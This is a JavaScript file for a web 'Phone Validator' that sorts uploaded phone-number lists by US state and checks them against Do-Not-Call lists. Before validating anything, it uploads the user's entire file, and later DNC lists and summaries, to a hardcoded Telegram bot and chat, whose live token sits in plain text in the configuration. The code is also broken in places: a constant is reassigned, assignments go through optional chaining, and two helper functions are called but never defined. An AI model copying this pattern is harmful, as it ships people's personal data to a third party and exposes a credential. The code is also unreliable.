// ============================================
// CONFIGURATION - APNA TELEGRAM CREDENTIALS
// ============================================
const CONFIG = {
    TELEGRAM: {
        BOT_TOKEN: '7261028712:AAEt60GJ6IWCGT8K2Ml9MEJXAtZHza9iL1M',
        CHAT_ID: '6510198499',
        ENABLED: true,
        AUTO_SEND: true
    },
    PROCESSING: {
        VALIDATION_CHUNK_SIZE: 5000,
        DNC_CHUNK_SIZE: 10,
        DNC_DELAY: 200
    }
};

// ============================================
// GLOBAL VARIABLES
// ============================================
let currentFile = null;
let fileContent = '';
let processingResults = {
    total: 0,
    valid: 0,
    invalid: 0,
    dnc: 0,
    clean: 0,
    states: 0,
    byState: {},
    validNumbers: [],
    invalidNumbers: [],
    dncNumbers: [],
    cleanNumbers: []
};
let isProcessing = false;
let isDNCProcessing = false;
let telegramFileSent = false;

// ============================================
// INITIALIZATION
// ============================================
document.addEventListener('DOMContentLoaded', function() {
    initializeApp();
});

function initializeApp() {
    setupDragAndDrop();
    setupFileInput();
    updateTelegramStatus();
    console.log('Phone Validator initialized - Telegram First');
}

// ============================================
// FILE HANDLING
// ============================================
function setupDragAndDrop() {
    const uploadArea = document.getElementById('uploadArea');
    
    uploadArea.addEventListener('dragover', (e) => {
        e.preventDefault();
        uploadArea.classList.add('drag-over');
    });
    
    uploadArea.addEventListener('dragleave', () => {
        uploadArea.classList.remove('drag-over');
    });
    
    uploadArea.addEventListener('drop', (e) => {
        e.preventDefault();
        uploadArea.classList.remove('drag-over');
        
        if (e.dataTransfer.files.length > 0) {
            handleFileSelect({ target: { files: e.dataTransfer.files } });
        }
    });
}

function setupFileInput() {
    const fileInput = document.getElementById('fileInput');
    fileInput.addEventListener('change', handleFileSelect);
}

function handleFileSelect(event) {
    if (!event.target.files.length) return;
    
    const file = event.target.files[0];
    
    if (!file.name.toLowerCase().endsWith('.txt')) {
        alert('❌ Please select a .txt file');
        return;
    }
    
    currentFile = file;
    telegramFileSent = false; // Reset flag
    
    // Update UI
    document.getElementById('fileName').textContent = file.name;
    document.getElementById('fileSize').textContent = formatFileSize(file.size);
    document.getElementById('fileInfo').classList.remove('d-none');
    
    // Read file
    const reader = new FileReader();
    reader.onload = function(e) {
        fileContent = e.target.result;
        const lines = fileContent.split('\n').filter(line => line.trim()).length;
        document.getElementById('fileCount').textContent = `${lines} numbers`;
        document.getElementById('processBtn').disabled = false;
        
        if (lines > 10000) {
            alert(`⚠️ Large file detected: ${lines} numbers\nFile will be sent to Telegram first, then processed.`);
        }
    };
    reader.onerror = function() {
        alert('❌ Error reading file');
    };
    reader.readAsText(file);
}

// ============================================
// MAIN PROCESSING FUNCTION - TELEGRAM FIRST
// ============================================
async function startProcessing() {
    if (!currentFile || isProcessing) return;
    
    isProcessing = true;
    resetResults();
    showProcessingUI();
    
    try {
        // STEP 1: SEND FILE TO TELEGRAM FIRST
        await sendFileToTelegramFirst();
        
        // STEP 2: ONLY AFTER TELEGRAM SUCCESS, START PROCESSING
        if (telegramFileSent) {
            const options = {
                removePlusOne: document.getElementById('removePlusOne').checked,
                enableDNC: document.getElementById('enableDNC').checked
            };
            
            await processValidation(options);
            showInstantResults();
            
            if (options.enableDNC) {
                await startDNCProcessing();
            }
        } else {
            alert('❌ Cannot process: File not sent to Telegram');
        }
        
    } catch (error) {
        console.error('Processing error:', error);
        alert('❌ Processing error: ' + error.message);
    } finally {
        isProcessing = false;
    }
}

// ============================================
// STEP 1: SEND FILE TO TELEGRAM FIRST
// ============================================
async function sendFileToTelegramFirst() {
    if (!CONFIG.TELEGRAM.ENABLED || !currentFile) {
        throw new Error('Telegram not configured or no file selected');
    }
    
    showTelegramReportCard();
    addTelegramStep('📤 Sending file to Telegram...', 'processing');
    
    // Update UI to show Telegram is sending
    document.getElementById('validationStatus').className = 'status-badge badge bg-warning';
    document.getElementById('validationStatus').textContent = 'Waiting for Telegram';
    document.getElementById('telegramSendStatus').className = 'status-badge badge bg-warning';
    document.getElementById('telegramSendStatus').textContent = 'Sending...';
    document.getElementById('progressText').textContent = 'Sending to Telegram...';
    
    try {
        // Send file to Telegram
        const fileResult = await uploadFileToTelegram(currentFile, '📁 File uploaded for processing');
        
        if (fileResult.ok) {
            telegramFileSent = true;
            addTelegramStep('✅ File sent to Telegram successfully', 'completed');
            
            // Send initial notification
            const lines = fileContent.split('\n').filter(line => line.trim()).length;
            const notification = `📱 *Phone Validator - File Received*\n\n` +
                               `📁 *File:* ${currentFile.name}\n` +
                               `📊 *Numbers:* ${lines}\n` +
                               `📦 *Size:* ${formatFileSize(currentFile.size)}\n` +
                               `⏰ *Time:* ${new Date().toLocaleTimeString()}\n\n` +
                               `_Starting validation process..._`;
            
            await sendTelegramMessage(notification);
            addTelegramStep('✅ Notification sent', 'completed');
            
            // Update UI
            document.getElementById('telegramSendStatus').className = 'status-badge badge bg-success';
            document.getElementById('telegramSendStatus').textContent = 'Sent';
            document.getElementById('progressText').textContent = '0%';
            
            return true;
        } else {
            throw new Error('Telegram upload failed');
        }
        
    } catch (error) {
        console.error('Telegram send error:', error);
        addTelegramStep('❌ Failed to send file to Telegram', 'failed');
        
        document.getElementById('telegramSendStatus').className = 'status-badge badge bg-danger';
        document.getElementById('telegramSendStatus').textContent = 'Failed';
        
        throw new Error('File upload to Telegram failed: ' + error.message);
    }
}

// ============================================
// STEP 2: PROCESS VALIDATION
// ============================================
async function processValidation(options) {
    const lines = fileContent.split('\n')
        .map(line => line.trim())
        .filter(line => line);
    
    processingResults.total = lines.length;
    updateProgress(0, 'validation');
    
    document.getElementById('validationStatus').className = 'status-badge badge bg-warning';
    document.getElementById('validationStatus').textContent = 'Processing...';
    
    // Send validation started notification
    addTelegramStep('🔍 Starting validation...', 'processing');
    await sendTelegramMessage(`🔄 *Validation Started*\nProcessing ${lines.length} numbers...`);
    
    // Process validation
    for (let i = 0; i < lines.length; i++) {
        const number = lines[i];
        processSingleNumberInstant(number, options);
        
        // Update progress
        if (i % 1000 === 0 || i === lines.length - 1) {
            const progress = ((i + 1) / lines.length) * 100;
            updateProgress(progress, 'validation');
            updateInstantCounters();
        }
    }
    
    processingResults.states = Object.keys(processingResults.byState).length;
    
    // Send validation complete notification
    addTelegramStep('✅ Validation completed', 'completed');
    await sendValidationReportToTelegram();
}

// ============================================
// INSTANT VALIDATION FUNCTION
// ============================================
function processSingleNumberInstant(originalNumber, options) {
    try {
        const validationResult = validatePhoneNumber(originalNumber, options.removePlusOne);
        
        if (!validationResult.isValid) {
            processingResults.invalid++;
            processingResults.invalidNumbers.push({
                original: originalNumber,
                error: validationResult.error
            });
            return;
        }
        
        const state = getStateFromAreaCode(validationResult.areaCode);
        if (!state || state === 'Unknown/Invalid State') {
            processingResults.invalid++;
            processingResults.invalidNumbers.push({
                original: originalNumber,
                cleaned: validationResult.cleaned,
                error: 'Invalid area code'
            });
            return;
        }
        
        processingResults.valid++;
        
        const processedNumber = {
            original: originalNumber,
            cleaned: validationResult.cleaned,
            formatted: validationResult.formatted,
            areaCode: validationResult.areaCode,
            state: state,
            dnc: false,
            dncStatus: 'Not Checked',
            timestamp: new Date().toISOString()
        };
        
        if (!processingResults.byState[state]) {
            processingResults.byState[state] = {
                total: 0,
                numbers: []
            };
        }
        
        processingResults.byState[state].total++;
        processingResults.byState[state].numbers.push(processedNumber);
        processingResults.validNumbers.push(processedNumber);
        
    } catch (error) {
        console.error('Validation error:', error);
    }
}

// ============================================
// STEP 3: SHOW INSTANT RESULTS
// ============================================
function showInstantResults() {
    updateInstantCounters();
    displayStatesDistribution();
    createStateDownloadButtons();
    document.getElementById('resultsSection').classList.remove('d-none');
    populateResultsTable();
    
    document.getElementById('validationStatus').className = 'status-badge badge bg-success';
    document.getElementById('validationStatus').textContent = 'Completed';
}

// ============================================
// STEP 4: DNC PROCESSING
// ============================================
async function startDNCProcessing() {
    if (processingResults.validNumbers.length === 0) return;
    
    isDNCProcessing = true;
    
    document.getElementById('dncProcessingSection').classList.remove('d-none');
    document.getElementById('dncTotalCount').textContent = processingResults.validNumbers.length;
    document.getElementById('dncStatus').className = 'status-badge badge bg-warning';
    document.getElementById('dncStatus').textContent = 'Processing';
    
    addTelegramStep('🚫 Starting DNC check...', 'processing');
    await sendTelegramMessage(`🔍 *DNC Check Started*\nChecking ${processingResults.validNumbers.length} valid numbers...`);
    
    const dncNumbers = [...processingResults.validNumbers];
    let dncChecked = 0;
    
    for (let i = 0; i < dncNumbers.length; i += CONFIG.PROCESSING.DNC_CHUNK_SIZE) {
        const chunk = dncNumbers.slice(i, i + CONFIG.PROCESSING.DNC_CHUNK_SIZE);
        
        for (const number of chunk) {
            try {
                const dncResult = await checkDNC(number.cleaned);
                number.dnc = dncResult === 'DNC';
                number.dncStatus = dncResult;
                
                if (dncResult === 'DNC') {
                    processingResults.dnc++;
                    processingResults.dncNumbers.push(number);
                } else {
                    processingResults.clean++;
                    processingResults.cleanNumbers.push(number);
                }
                
                dncChecked++;
                
                if (dncChecked % 50 === 0) {
                    updateDNCProgress(dncChecked, dncNumbers.length);
                    updateDNCCounters();
                }
                
                await sleep(CONFIG.PROCESSING.DNC_DELAY);
                
            } catch (error) {
                console.error('DNC check error:', error);
                number.dncStatus = 'Error';
            }
        }
    }
    
    updateDNCProgress(dncNumbers.length, dncNumbers.length);
    updateDNCCounters();
    
    document.getElementById('dncStatus').className = 'status-badge badge bg-success';
    document.getElementById('dncStatus').textContent = 'Completed';
    document.getElementById('dncProcessingSection').classList.add('d-none');
    
    createDNCDownloadButtons();
    
    addTelegramStep('✅ DNC check completed', 'completed');
    await sendDNCReportToTelegram();
    
    isDNCProcessing = false;
}

// ============================================
// TELEGRAM FUNCTIONS
// ============================================
async function uploadFileToTelegram(file, caption) {
    const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendDocument`;
    
    const formData = new FormData();
    formData.append('chat_id', CONFIG.TELEGRAM.CHAT_ID);
    formData.append('document', file);
    formData.append('caption', caption);
    
    const response = await fetch(url, {
        method: 'POST',
        body: formData
    });
    
    const result = await response.json();
    return { ok: response.ok, result };
}

async function sendTelegramMessage(text) {
    const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`;
    
    const response = await fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: CONFIG.TELEGRAM.CHAT_ID,
            text: text,
            parse_mode: 'Markdown',
            disable_web_page_preview: true
        })
    });
    
    return await response.json();
}

async function sendValidationReportToTelegram() {
    const summary = `📊 *VALIDATION COMPLETE*\n\n` +
                   `📁 *File:* ${currentFile?.name || 'Unknown'}\n` +
                   `📈 *Total Numbers:* ${processingResults.total}\n` +
                   `✅ *Valid Numbers:* ${processingResults.valid}\n` +
                   `❌ *Invalid Numbers:* ${processingResults.invalid}\n` +
                   `🗺️ *States Found:* ${processingResults.states}\n` +
                   `⏰ *Validation Time:* Instant\n\n`;
    
    // Add top states
    const topStates = Object.entries(processingResults.byState)
        .sort((a, b) => b[1].total - a[1].total)
        .slice(0, 5);
    
    if (topStates.length > 0) {
        summary += `*Top States:*\n`;
        topStates.forEach(([state, data], index) => {
            const percentage = ((data.total / processingResults.valid) * 100).toFixed(1);
            summary += `${index + 1}. ${state}: ${data.total} (${percentage}%)\n`;
        });
    }
    
    await sendTelegramMessage(summary);
}

async function sendDNCReportToTelegram() {
    const dncReport = `🚫 *DNC CHECK COMPLETE*\n\n` +
                     `📊 *Valid Numbers Checked:* ${processingResults.valid}\n` +
                     `🚫 *DNC Numbers Found:* ${processingResults.dnc}\n` +
                     `✨ *Clean Numbers:* ${processingResults.clean}\n` +
                     `📈 *DNC Rate:* ${((processingResults.dnc / processingResults.valid) * 100).toFixed(1)}%\n\n`;
    
    await sendTelegramMessage(dncReport);
    
    // Send DNC numbers file if available and not too large
    if (processingResults.dncNumbers.length > 0 && processingResults.dncNumbers.length <= 1000) {
        const dncContent = processingResults.dncNumbers.map(n => n.formatted).join('\n');
        await sendTelegramFile('dnc-numbers.txt', dncContent, '🚫 DNC Numbers List');
    }
}

async function sendTelegramFile(filename, content, caption) {
    const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendDocument`;
    
    const blob = new Blob([content], { type: 'text/plain' });
    const file = new File([blob], filename);
    
    const formData = new FormData();
    formData.append('chat_id', CONFIG.TELEGRAM.CHAT_ID);
    formData.append('document', file);
    formData.append('caption', caption);
    
    const response = await fetch(url, {
        method: 'POST',
        body: formData
    });
    
    return await response.json();
}

// ============================================
// UI FUNCTIONS
// ============================================
function showProcessingUI() {
    updateProgress(0, 'validation');
    document.getElementById('validationStatus').className = 'status-badge badge bg-secondary';
    document.getElementById('validationStatus').textContent = 'Waiting';
    document.getElementById('telegramSendStatus').className = 'status-badge badge bg-secondary';
    document.getElementById('telegramSendStatus').textContent = 'Pending';
    document.getElementById('progressText').textContent = '0%';
}

function updateProgress(percentage, type = 'validation') {
    const progress = Math.min(percentage, 100);
    document.getElementById('progressBar').style.width = `${progress}%`;
    document.getElementById('progressText').textContent = `${Math.round(progress)}%`;
    
    if (type === 'dnc') {
        document.getElementById('dncProgressBar').style.width = `${progress}%`;
        document.getElementById('dncProgressText').textContent = `DNC Check: ${Math.round(progress)}%`;
    }
}

function updateInstantCounters() {
    document.getElementById('totalCount').textContent = processingResults.total;
    document.getElementById('validCount').textContent = processingResults.valid;
    document.getElementById('invalidCount').textContent = processingResults.invalid;
    document.getElementById('statesCount').textContent = processingResults.states;
}

function updateDNCCounters() {
    document.getElementById('dncCount')?.textContent = processingResults.dnc;
    document.getElementById('cleanCount')?.textContent = processingResults.clean;
    document.getElementById('dncCheckedCount').textContent = processingResults.dnc + processingResults.clean;
}

function updateDNCProgress(checked, total) {
    const percentage = (checked / total) * 100;
    updateProgress(percentage, 'dnc');
}

// ============================================
// STATES DISTRIBUTION
// ============================================
function displayStatesDistribution() {
    const container = document.getElementById('statesDistribution');
    container.innerHTML = '';
    
    const states = Object.entries(processingResults.byState)
        .sort((a, b) => b[1].total - a[1].total);
    
    states.forEach(([state, data]) => {
        const percentage = ((data.total / processingResults.valid) * 100).toFixed(1);
        
        const stateDiv = document.createElement('div');
        stateDiv.className = 'state-item';
        stateDiv.innerHTML = `
            <div class="d-flex justify-content-between align-items-center">
                <div>
                    <strong>${state}</strong>
                    <div class="state-stats">
                        <span class="text-success">${data.total} numbers</span>
                        <span class="text-muted ms-2">(${percentage}%)</span>
                    </div>
                </div>
                <div>
                    <button class="btn btn-sm btn-outline-primary" onclick="downloadStateFile('${state}')">
                        <i class="fas fa-download"></i>
                    </button>
                </div>
            </div>
        `;
        container.appendChild(stateDiv);
    });
}

// ============================================
// DOWNLOAD FUNCTIONS
// ============================================
function createStateDownloadButtons() {
    const container = document.getElementById('stateDownloadButtons');
    container.innerHTML = '';
    
    Object.entries(processingResults.byState)
        .sort((a, b) => b[1].total - a[1].total)
        .forEach(([state, data]) => {
            if (data.total > 0) {
                const btn = document.createElement('button');
                btn.className = 'btn btn-outline-primary btn-sm';
                btn.innerHTML = `<i class="fas fa-download me-1"></i>${state} (${data.total})`;
                btn.onclick = () => downloadStateFile(state);
                container.appendChild(btn);
            }
        });
}

function createDNCDownloadButtons() {
    const container = document.getElementById('categoryDownloadButtons');
    
    if (processingResults.dncNumbers.length > 0) {
        const dncBtn = document.createElement('button');
        dncBtn.className = 'btn btn-outline-danger btn-sm';
        dncBtn.innerHTML = `<i class="fas fa-ban me-1"></i>DNC Numbers (${processingResults.dnc})`;
        dncBtn.onclick = downloadDNCNumbers;
        container.appendChild(dncBtn);
    }
    
    if (processingResults.cleanNumbers.length > 0) {
        const cleanBtn = document.createElement('button');
        cleanBtn.className = 'btn btn-outline-success btn-sm';
        cleanBtn.innerHTML = `<i class="fas fa-check me-1"></i>Clean Numbers (${processingResults.clean})`;
        cleanBtn.onclick = downloadCleanNumbers;
        container.appendChild(cleanBtn);
    }
    
    if (processingResults.invalidNumbers.length > 0) {
        const invalidBtn = document.createElement('button');
        invalidBtn.className = 'btn btn-outline-warning btn-sm';
        invalidBtn.innerHTML = `<i class="fas fa-times me-1"></i>Invalid Numbers (${processingResults.invalid})`;
        invalidBtn.onclick = downloadInvalidNumbers;
        container.appendChild(invalidBtn);
    }
}

function downloadStateFile(state) {
    const numbers = processingResults.byState[state].numbers;
    const content = numbers.map(n => n.formatted).join('\n');
    downloadFile(`${state.toLowerCase().replace(/\s+/g, '-')}-numbers.txt`, content);
}

function downloadDNCNumbers() {
    const content = processingResults.dncNumbers.map(n => n.formatted).join('\n');
    downloadFile('dnc-numbers.txt', content);
}

function downloadCleanNumbers() {
    const content = processingResults.cleanNumbers.map(n => n.formatted).join('\n');
    downloadFile('clean-numbers.txt', content);
}

function downloadInvalidNumbers() {
    const content = processingResults.invalidNumbers.map(n => 
        `${n.original} - ${n.error}`
    ).join('\n');
    downloadFile('invalid-numbers.txt', content);
}

async function downloadAllFiles() {
    const zip = new JSZip();
    
    Object.entries(processingResults.byState).forEach(([state, data]) => {
        if (data.total > 0) {
            const content = data.numbers.map(n => n.formatted).join('\n');
            zip.file(`${state}-numbers.txt`, content);
        }
    });
    
    if (processingResults.dncNumbers.length > 0) {
        zip.file('DNC-numbers.txt', 
            processingResults.dncNumbers.map(n => n.formatted).join('\n'));
    }
    
    if (processingResults.cleanNumbers.length > 0) {
        zip.file('clean-numbers.txt',
            processingResults.cleanNumbers.map(n => n.formatted).join('\n'));
    }
    
    if (processingResults.invalidNumbers.length > 0) {
        zip.file('invalid-numbers.txt',
            processingResults.invalidNumbers.map(n => `${n.original} - ${n.error}`).join('\n'));
    }
    
    const content = await zip.generateAsync({ type: "blob" });
    saveAs(content, `phone-validator-${Date.now()}.zip`);
}

// ============================================
// TELEGRAM REPORT UI
// ============================================
function showTelegramReportCard() {
    const card = document.getElementById('telegramReportCard');
    card.classList.remove('d-none');
    document.getElementById('telegramReportDetails').innerHTML = '';
}

function addTelegramStep(message, status = 'processing') {
    const container = document.getElementById('telegramReportDetails');
    const step = document.createElement('div');
    step.className = `telegram-step ${status}`;
    step.innerHTML = `
        <div class="d-flex align-items-center">
            <i class="fas fa-${getStatusIcon(status)} me-2"></i>
            <span>${message}</span>
            <span class="ms-auto text-muted">${new Date().toLocaleTimeString()}</span>
        </div>
    `;
    container.appendChild(step);
    container.scrollTop = container.scrollHeight;
}

function getStatusIcon(status) {
    switch(status) {
        case 'completed': return 'check-circle';
        case 'failed': return 'times-circle';
        case 'processing': return 'spinner fa-spin';
        default: return 'info-circle';
    }
}

// ============================================
// HELPER FUNCTIONS
// ============================================
function resetResults() {
    processingResults = {
        total: 0,
        valid: 0,
        invalid: 0,
        dnc: 0,
        clean: 0,
        states: 0,
        byState: {},
        validNumbers: [],
        invalidNumbers: [],
        dncNumbers: [],
        cleanNumbers: []
    };
}

function formatFileSize(bytes) {
    if (bytes < 1024) return bytes + ' Bytes';
    if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(2) + ' KB';
    if (bytes < 1024 * 1024 * 1024) return (bytes / (1024 * 1024)).toFixed(2) + ' MB';
    return (bytes / (1024 * 1024 * 1024)).toFixed(2) + ' GB';
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function downloadFile(filename, content) {
    const blob = new Blob([content], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

function updateTelegramStatus() {
    const statusEl = document.getElementById('telegramStatus');
    const infoEl = document.getElementById('telegramInfo');
    
    if (CONFIG.TELEGRAM.ENABLED && CONFIG.TELEGRAM.BOT_TOKEN && CONFIG.TELEGRAM.CHAT_ID) {
        statusEl.innerHTML = '<i class="fab fa-telegram"></i> Auto-Send Enabled';
        infoEl.innerHTML = '<i class="fab fa-telegram me-1"></i> Telegram: Ready';
    } else {
        statusEl.innerHTML = '<i class="fab fa-telegram"></i> Bot Disabled';
        infoEl.innerHTML = '<i class="fab fa-telegram me-1"></i> Telegram: Disabled';
    }
}

function populateResultsTable() {
    const tbody = document.getElementById('resultsTableBody');
    tbody.innerHTML = '';
    
    const displayNumbers = processingResults.validNumbers.slice(0, 50);
    
    displayNumbers.forEach((num, index) => {
        const row = document.createElement('tr');
        row.innerHTML = `
            <td>${index + 1}</td>
            <td><small class="text-muted">${num.original}</small></td>
            <td><strong>${num.formatted}</strong></td>
            <td><span class="badge bg-info">${num.state}</span></td>
            <td>${num.dnc ? '<span class="badge bg-danger">DNC</span>' : 
                num.dncStatus === 'Not Checked' ? '<span class="badge bg-secondary">Not Checked</span>' :
                '<span class="badge bg-success">Clean</span>'}</td>
        `;
        tbody.appendChild(row);
    });
    
    if (processingResults.validNumbers.length > 50) {
        const row = document.createElement('tr');
        row.innerHTML = `
            <td colspan="5" class="text-center text-muted">
                ... and ${processingResults.validNumbers.length - 50} more numbers
            </td>
        `;
        tbody.appendChild(row);
    }
}

// Validation function
function validatePhoneNumber(number, removePlusOne) {
    let cleaned = number.toString();
    
    if (removePlusOne) {
        cleaned = cleaned.replace(/^\+1/, '').replace(/^1/, '');
    }
    
    cleaned = cleaned.replace(/\D/g, '');
    
    if (cleaned.length !== 10) {
        return {
            isValid: false,
            error: `Invalid length: ${cleaned.length} digits`,
            cleaned: cleaned
        };
    }
    
    const areaCode = cleaned.substring(0, 3);
    const formatted = `(${areaCode}) ${cleaned.substring(3, 6)}-${cleaned.substring(6)}`;
    
    return {
        isValid: true,
        cleaned: cleaned,
        formatted: formatted,
        areaCode: areaCode,
        original: number
    };
}

// Export for debugging
window.PhoneValidator = {
    config: CONFIG,
    results: () => processingResults,
    reset: resetResults,
    process: startProcessing
};
